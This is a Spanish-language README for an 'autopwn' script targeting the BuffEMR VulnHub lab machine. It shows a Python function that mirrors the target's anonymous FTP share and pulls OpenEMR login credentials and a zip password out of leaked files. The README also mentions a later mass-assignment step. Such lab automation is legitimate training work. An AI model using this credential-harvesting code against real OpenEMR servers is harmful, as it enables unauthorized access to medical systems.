# Autopwn - BuffEMR

En caso de no haber realizado la máquina BuffEMR, es recomendable revisar el [writeup](http://mrpr1ngl3s.github.io/vulnhub/buffemr/ ) para comprender el autopwn.

<p align="center">
	<img src="Img/Autopwn-BuffEMR.png"
		alt="autopwn"
	style="float: left; margin-right: 10px;" />
</p>

# Funcionamiento

Lo primero que realiza el script es la obtención de las credenciales del usuario de la página, para poder realizar el Mass Assignment, y la contraseña del archivo .zip.

```python
def GetCredentials():
	os.system(f"wget -r ftp://{IP} 2>/dev/null")

	with open(f"{IP}/share/openemr/tests/test.accounts") as f:
		credentials = f.read()

	user = re.findall("(.*):", credentials)[1]

	password = re.findall(":(.*)", credentials)[1]

	with open(f"{IP}/share/openemr/sql/keys.sql") as f:
		credentials = f.read()

	passzip = re.findall('"pdfkey", "(.*?)"', credentials)[0]

	return user, password, passzip
```

